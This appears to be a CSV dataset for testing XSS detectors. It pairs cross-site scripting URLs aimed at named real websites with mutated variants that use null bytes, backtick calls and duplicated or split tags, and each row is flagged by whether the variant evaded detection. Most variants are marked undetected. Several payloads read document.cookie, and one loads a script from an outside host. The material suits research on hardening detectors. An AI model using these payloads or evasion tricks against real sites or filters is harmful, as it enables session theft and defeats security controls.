Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://pipelines.centerpointenergy.com/reports_list.aspx?reporttype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://pipelines.centerpointenergy.com/reports_list.aspx?reporttype=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/scrip<br%00 t&gt;,"[['http://u', 'None', 'None']]",True
http://nations.tm-exchange.com/main.aspx?action=trackshow&amp;id=741220%22%3e%3cscript%20src=//0x.lv%3e#<br>alert('airroxssed');,"[['http://u', 'id=', '>', 'None', 'alert(', 'None', ')']]",http://nations.tm-exchange.com/main.aspx?action=trackshow&amp;id=741220%22%3cscript%20src=//0x.lv%3cscript%20src=//0x.lv%3e#<br><br>alert`'airroxssed'`;,"[['http://u', 'id=', 'None', 'None']]",True
http://www.mercadolibre.com.ec/ecuador/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,"[['http://u', 'as_nickname=', 'as_pcia_id=', '>', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",http://www.mercadolibre.com.ec/ecuador/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3c%00script%3c%00script%3ealert%28%27xss%27%29;%3c/script%00%3c%00/script%3e,"[['http://u', 'as_nickname=', 'as_pcia_id=', '>', 'None', 'alert(', ""'xss'"", ')', 'None']]",False
"http://www.catholicculture.org/search/resultslist.cfm?resourcetype=2&amp;requesttype=sitebrowserate&amp;fide<br>lity=green&amp;resources=a%27+union+select+1,%27%3cscript%3ealert%28document.cookie%29;%3c/script%3e%27,<br>3,%27green%27+--+-+&amp;useability=%2b","[['http://u', 'None', 'None', 'None', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'None', 'None']]","http://www.catholicculture.org/search/resultslist.cfm?resourcetype=2&amp;requesttype=sitebrowserate&amp;fide<br <br lity=green&amp;resources=a%27+union+select+1,%27%3cscript%3cscript%3ealert%28document.cookie%29;%3c/script%3c/script%3e%27,<br <br 3,%27green%27+--+-+&amp;useability=%2b","[['http://u', 'None', 'None', 'alert(', 'document.cookie', ')', 'None', 'None', 'None', 'None', 'None']]",False
http://www.kpk.gov.pl/search%3cimg%20src=%3e%22%3e%3cscript%20%3ealert(1337);%3c/script%3e,"[['http://u', '>', '>', '<script >', 'alert(', '0', ')', '</script>']]",http://www.kpk.gov.pl/search%3cimg%20src=%3cimg%20src=%3e%22%3cscript%20%3cscript%20%3ealert`1337`;%3c/script%3c/script%3e,"[['http://u', 'None', 'None', 'None']]",True
http://www.aromascope.com/index.php?s=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%<br>3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;searchbutton=go!,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>', 'None']]",http://www.aromascope.com/index.php?s=%27%22%3c%2ftitle%3cscript%3c%2ftitle%3cscript%3c%2ftitle%3cscript%3c%2ftitle%3cscript%3etop['al'+'ert']`1``1337`%3c%2fscript%3c%2fscript%3c%2fscript%3c%2fscript%3e%<br 3e%3cmarquee%3ch1%3cmarquee%3ch1%3cmarquee%3ch1%3cmarquee%3ch1%3exss+by+xylitol%3c%2fh1%3c%2fmarquee%3c%2fh1%3c%2fmarquee%3c%2fh1%3c%2fmarquee%3c%2fh1%3c%2fmarquee%3e&amp;searchbutton=go!,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://meetings.nigms.nih.gov/?id=3305%22%3e%3cscript%3ealert(1337)%3c/script%3e%22%3e%3cscript%3eal<br>ert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', '>', '<script>', 'alert(', '</h0>', '</marquee>']]",http://meetings.nigms.nih.gov/?id=3305%22%3c%00script%3ealert`1337`%3c/script%00%3e%22%3cscript%00%3eal<br%00>ert`%22xss%20by%20\nxylitol%3c%00/h1%3c/marquee%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://www.blogdigger.com/media/search.jsp?q=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",//www.blogdigger.com/media/search.jsp?q=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://csd.toshiba.com/cgi-bin/tais/su/su_sc_domlog.jsp?cnum=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', '<""']]",http://csd.toshiba.com/cgi-bin/tais/su/su_sc_domlog.jsp?cnum=&quot;&lt;%00script&lt;%00script&gt;alert`1`&lt;%00/script&lt;%00/script&lt;&quot;,"[['http://u', 'None', 'None']]",True
http://www.geceshow.com/index.php?u=model&amp;mid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.geceshow.com/index.php?u=model&amp;mid=&quot;&lt;script%00&gt;alert`document.cookie`&lt;%00/script&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.aiv.by/czasopisy/mat.php?cz_h=2003&amp;cz_n=03&amp;mat_id1=03200304&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.aiv.by/czasopisy/mat.php?cz_h=2003&amp;cz_n=03&amp;mat_id1=03200304&quot;&lt;script%00&gt;alert`document.cooki<br%00>e`&lt;%00/script&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
"http://gosee.com/search/search.php?page=13&amp;type=links&amp;swords=%22%3e%3cscript%3ealert(string.fromchar<br>code(115,101,121,109,101,110))%3c/script%3e","[['http://u', 'type=', 'None', '>', '<script>', 'alert(', 'string.fromcharcode(', 'None', ')', '</script>']]","http://gosee.com/search/search.php?page=13&amp;type=links&amp;swords=%22%3cscript%00%3cscript%00%3ealert(string.fromchar<br%00 <br%00 code(115,101,121,109,101,110))%3c%00/script%3c%00/script%3e","[['http://u', 'type=', 'None', 'None', 'alert(', 'None']]",True
http://genome.cse.ucsc.edu/cgi-bin/hgtracks?position=chr1:155204244-155211053&amp;hgsid=%22%3e%3cscript%<br>3ealert%28document.cookie%29%3c/script%3e,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://genome.cse.ucsc.edu/cgi-bin/hgtracks?position=chr1:155204244-155211053&amp;hgsid=%22%3cscript%<br%00 3ealert%28document.cookie%29%3c/script%3e%3cscript%<br%00 3ealert%28document.cookie%29%3c/script%3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.mcdonalds.it/prodotti/panini.asp?p=mcroyaldeluxe&quot;&gt;&lt;script<br>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&gt;&lt;/script&gt;,"[['http://u', '>', 'None', '</script>']]",http://www.mcdonalds.it/prodotti/panini.asp?p=mcroyaldeluxe&quot;&lt;script<br src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&lt;script<br src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&lt;script<br src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&lt;script<br src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&lt;/script&lt;/script&lt;/script&lt;/script&gt;,"[['http://u', 'None']]",True
http://www.news.com/2038-12_3-0-topic.html?id=7965&amp;name=%22%3e'%3e%3cscript%3ealert(123)%3c/script%3<br>e%22'&amp;tag=st.topic,"[['http://u', 'name=', '>', '>', '<script>', 'alert(', '0', ')', '</script>', 'tag=']]",http://www.news.com/2038-12_3-0-topic.html?id=7965&amp;name=%22%3e'%3c%00script%00%3ealert`123`%3c/script%3<br%00 e%22'&amp;tag=st.topic,"[['http://u', 'name=', '>', 'None', 'None', 'tag=']]",False
http://marketing.philly.monster.com/send/?url=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script<br>%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://marketing.philly.monster.com/send/?url=%22%3cscript<script>/drfv//drfv//drfv//drfv//drfv/alert%28document.cookie%29%3c/script<br %3c/script<br %3e,"[['http://u', 'None', 'alert(', 'document.cookie', ')', 'None']]",False
http://uni70.ogame.de/game/redir.php?url=&lt;&quot;&lt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '<""<<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://uni70.ogame.de/game/redir.php?url=&lt;&quot;&lt;&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.awa.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', 'id=', 'ortak=', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.awa.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&lt;script&lt;script&lt;script&lt;script&gt;alert`&quot;backdoor&quot;`&lt;/script&lt;/script&lt;/script&lt;/script&gt;,"[['http://u', 'id=', 'ortak=', 'None', 'None']]",True
http://www.seriilan.com/index.php?goster=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/<br>script%3e,"[['http://u', '>', '>', '<script \n\r>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.seriilan.com/index.php?goster=%3e%22%3c%00script%20%0a%0d%00%00%3ealert`document.cookie`%3b%3c%00%00/<br script%00%3e,"[['http://u', '>', 'None', 'None']]",False
http://ideas.mit.edu/~pscadmin/search-process.php?textsearch=%27%3balert%28string.fromcharcode%2884%<br>2c69%2c83%2c84%2c69%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2<br>f%2f%22%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f%5c%22%3balert%28string.fr<br>omcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28s<br>tring.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%3c%2fscript%3e,"[['http://u', 'alert(', 'string.fromcharcode(', 'None', ')', '</script>']]",http://ideas.mit.edu/~pscadmin/search-process.php?textsearch=%27%3btop[al+ert]`1`%28string.fromcharcode%2884%<br%00%00%0D <br%00%00%0D <br%00%00%0D <br%00%00%0D 2c69%2c83%2c84%2c69%29%29%2f%2f%5c%27%3btop[al+ert]`1`%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2<br%00%00%0D <br%00%00%0D <br%00%00%0D <br%00%00%0D f%2f%22%3btop[al+ert]`1`%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f%5c%22%3btop[al+ert]`1`%28string.fr<br%00%00%0D <br%00%00%0D <br%00%00%0D <br%00%00%0D omcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f--%3c%2fscript%00%00%3e%3c%00%2fscript%00%3e%3c%00%2fscript%00%3e%3c%2fscript%00%00%3e%22%3e%27%3c%00script%00%3e%3c%00script%00%3e%3cscript%00%00%3e%3c%00script%00%3etop[al+ert]`1`%28s<br%00%00%0D <br%00%00%0D <br%00%00%0D <br%00%00%0D tring.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%3c%00%00%2fscript%3e%3c%00%2fscript%00%3e%3c%00%00%2fscript%3e%3c%00%2fscript%00%3e,"[['http://u', 'string.fromcharcode(', 'None', 'None', 'None', 'None', '>', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",False
http://eur-lex.europa.eu/result.do?arg0=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%3c<br>h1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e&amp;arg1=%3ca%20onmouseover=alert(/st@r-gaz3r/)%3e;)%3ca/%3e&amp;arg2<br>=%3ca%20onmouseover=alert(/st@r-gaz3r/)%3e;)%3ca/%3e&amp;titre=titre&amp;chlang=en&amp;rechtype=rech_mot&amp;submit=<br>search,"[['http://u', '<script>', 'alert(', '/st@r-gaz0r/', ')', '</script>', '<marquee>', '<h0>', '</h0>', '</marquee>', 'None', 'None', ')', 'None', 'None', 'None', ')', 'None', 'None', 'None', 'None', 'submit=']]",http://eur-lex.europa.eu/result.do?arg0=%3cscript%00%3ealert`/st@r-gaz3r/`%3c/script%00%3e%3cmarquee%00%3e%3c%00<br>h1%3est@r-gaz3r%3c/h1%00%3e%3c%00/marquee%3e&amp;arg1=%3c%00a%20onmouseover=alert`/st@r-gaz3r/`%3e;`%3ca/%00%3e&amp;arg2<br%00>=%3c%00a%20onmouseover=alert`/st@r-gaz3r/`%3e;`%3ca/%00%3e&amp;titre=titre&amp;chlang=en&amp;rechtype=rech_mot&amp;submit=<br%00>search,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'submit=', 'None']]",True
http://www.maitri.us/maitri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.maitri.us/maitri/igallery.asp?d=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;&lt;%00marquee&lt;h1&gt;by<br%00>%20narcoticxs&lt;/h1&lt;/marquee%00&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://vip.asus.com/eservice/techservok.aspx?slanguage=en-us&amp;caseid=%3cscript%3ealert(%22xss%20by%20<br>mrdoug%22)%3c/script%3e,"[['http://u', 'None', '<script>', 'alert(', ')', '</script>']]",http://vip.asus.com/eservice/techservok.aspx?slanguage=en-us&amp;caseid=%3c%00script%3e%3c%00script%3ealert`%22xss%20by%20<br%00><br%00>mrdoug%22`%3c/script%00%3e%3c/script%00%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://som1.umaryland.edu/share_edited.asp?url=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://som1.umaryland.edu/share_edited.asp?url=&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www1.caixa.gov.br/atendimento/canais_atendimento/agencia.asp?tipoparametro=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www1.caixa.gov.br/atendimento/canais_atendimento/agencia.asp?tipoparametro=&quot;&lt;script&lt;script&gt;alert`do<br><br>cument.cookie`&lt;/script&lt;/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.emiweb.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;<br>/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.emiweb.de/index.php?page=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/script&gt;&lt;marquee&lt;h1%00&gt;backdoor&lt;<br>/h1&lt;/marquee%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://ucirvinesports.cstv.com/search/ucir-search.html?s3q=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://ucirvinesports.cstv.com/search/ucir-search.html?s3q=&quot;&lt;script%00&gt;alert`123`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.kpk.gov.pl/search%3cimg%20src=%3e%22%3e%3cscript%20%3ealert(1337);%3c/script%3e,"[['http://u', '>', '>', '<script >', 'alert(', '0', ')', '</script>']]",http://www.kpk.gov.pl/search%3cimg%20src=%3e%22%3cscript%20%3ealert`1337`;%3c/script%3e,"[['http://u', '>', '<script >', '</script>']]",False
http://games.levelupgames.uol.com.br/ragnarok/noticias/noticia.php?id_noticia=&quot;&gt; &lt;script&gt;alert(&quot;i'm<br>an xss&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', ')', '</script>']]",http://games.levelupgames.uol.com.br/ragnarok/noticias/noticia.php?id_noticia=&quot;&gt; &lt;script&lt;script&lt;script&lt;script&gt;alert`&quot;im<br <br an xss&quot;`&lt;/script&lt;/script&lt;/script&lt;/script&gt;,"[['http://u', '>', 'None', 'None']]",False
http://identifiant.chez-alice.fr/info.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%3csc<br>ript%3ealert(document.cookie);%3c/script%3e,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>']]",http://identifiant.chez-alice.fr/info.php?a[]=%3cscript%00%3ealert`/xssed_by_omeha/`;%3c/script%00%3e%3csc<br>ript%00%3ealert`document.cookie`;%3c/script%00%3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.andywangmusic.com/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.andywangmusic.com/igallery/login.asp?folder=&quot;&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;&lt;ma<br>rquee&lt;h1%00&gt;by+narcoticxs&lt;/h1&lt;%00/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
"http://guides.lib.virginia.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';al<br>ert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromchar<br>code(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;","[['http://u', 'tag=', 'alert(', 'string.fromcharcode(', '0,0,0))//\';alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//--></script>"">\'><script>alert(string.fromcharcode(0,0,0)', ')', '</script>']]","http://guides.lib.virginia.edu/searchtags.php?iid=&amp;tag=;alert`string.fromcharcode`88,83,83``//\;al<br%00%00 ert`string.fromcharcode`88,83,83``//&quot;;alert`string.fromcharcode`88,83,83``//\&quot;;alert`string.fromchar<br%00%00 code`88,83,83``//--&lt;%00%00%00/script&gt;&quot;&gt;&lt;%00script%00%00&gt;alert`string.fromcharcode`88,83,83``&lt;%00%00/script%00&gt;","[['http://u', 'tag=', 'None', '>', 'None', 'None']]",False
http://www.bilgiportal.com/indir/index.php?act=view&amp;id=23&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', 'id=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",//www.bilgiportal.com/indir/index.php?act=view&amp;id=23&quot;&lt;script&lt;script&gt;alert`document.cookie`&lt;/script&lt;/script&gt;,"[['http://u', 'id=', 'None', 'None']]",True
http://www.bibliotecas.cm-amadora.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsea<br>rch=1&amp;searchtxt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', 'form=', 'startrec=', 'recpag=', 'newsearch=', 'searchtxt=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.bibliotecas.cm-amadora.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsea<br%00 rch=1&amp;searchtxt=&quot;&gt;&lt;script%00&gt;alert`document.cookie`&lt;%00/script&gt;,"[['http://u', 'form=', 'startrec=', 'recpag=', 'None', 'None', 'None']]",True
http://www.dhh.louisiana.gov/news.asp?arch=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.dhh.louisiana.gov/news.asp?arch=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://amazonas.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/sc<br>ript%3e,"[['http://u', '>', '<script>', 'alert(', '/xssed/', ')', '</script>']]",http://amazonas.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3cscript%00%3ealert`/xssed/`;%3c/sc<br%00 ript%3e,"[['http://u', 'None', 'None']]",True
"http://www.computerbild.de/cb/ekf/suchergebnis.html?cpdb_cid=""><script>alert(document.cookie)</script>","[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]","http://www.computerbild.de/cb/ekf/suchergebnis.html?cpdb_cid=""><script>alert`document.cookie`</script>","[['http://u', '>', '<script>', '</script>']]",False
http://mtv2.mtv.com/search/?searchterm=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%22%3e%3cscript%<br>3ealert%281%29%3c%2fscript%3e&amp;searchtype=1,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>', 'searchtype=']]",http://mtv2.mtv.com/search/?searchterm=%22<script>/drfv/alert%281%29%3c%2fscript%3e%22%3cscript%<br>3ealert%281%29%3c%2fscript%3e&amp;searchtype=1,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>', 'searchtype=']]",False
https://reg.sun.com/register?program=&quot;/&gt;&lt;script&gt;alert(/xss: vijayendra/)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",https://reg.sun.com/register?program=&quot;/&lt;script&lt;script&gt;alert`/xss: vijayendra/`&lt;/script&lt;/script&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.getconnectedmen.com/member/online_list.php?view_mode=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.getconnectedmen.com/member/online_list.php?view_mode=&quot;&lt;%00script&gt;alert`&quot;backdoor&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://monavenir.hsbc.fr/hsbc_solo_duo.html?co=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://monavenir.hsbc.fr/hsbc_solo_duo.html?co=1&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
